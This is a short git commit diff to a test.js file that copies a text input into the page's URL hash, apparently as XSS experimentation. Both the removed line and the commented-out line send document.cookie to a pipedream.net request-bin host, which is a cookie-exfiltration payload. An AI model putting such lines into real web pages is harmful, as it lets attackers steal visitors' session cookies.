5e6a47758b2544ea8108d5dd6401f642c630133e
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-24 17:43:39 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,8 @@
-window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
+const word = document.getElementById("word");
+const res = document.getElementById("result");
+
+word.oninput = () => {
+   document.location.hash = word.value;
+}
+  
+//window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
